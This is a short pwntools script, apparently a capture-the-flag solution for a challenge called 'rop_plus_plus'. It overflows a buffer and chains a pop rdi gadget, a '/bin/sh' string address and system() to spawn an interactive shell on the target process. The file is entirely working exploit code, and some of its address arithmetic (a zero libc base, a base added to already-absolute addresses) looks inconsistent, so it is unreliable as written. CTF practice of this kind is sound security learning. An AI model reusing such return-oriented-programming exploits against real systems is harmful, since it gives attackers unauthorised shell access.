from pwn import *

context.arch = "amd64"

#r = remote('edu-ctf.zoolab.org', 10002)
r=process('pwn/rop_plus_plus/chal')

libc_base=0
pie_base=0x400000  
pop_rdi=0x40181a+pie_base
system_addr = libc_base + 0x00000000004012d3 
bin_sh=libc_base+0x1b45bd#strings -a -t x pwn/sakana/libc-2.31.so | grep /bin/sh#??
offset=16#buffer size
_ret=0x0000000000448e67+pie_base#found in binary by ropper

output=r.recvuntil(b'code\n')
print(output)
payload = flat(
    b'a'*offset,
    b'a'*8,
    pop_rdi,
    bin_sh,
    _ret,
    system_addr
)

r.send(payload)
output=r.recvall()
print(output)
r.interactive()
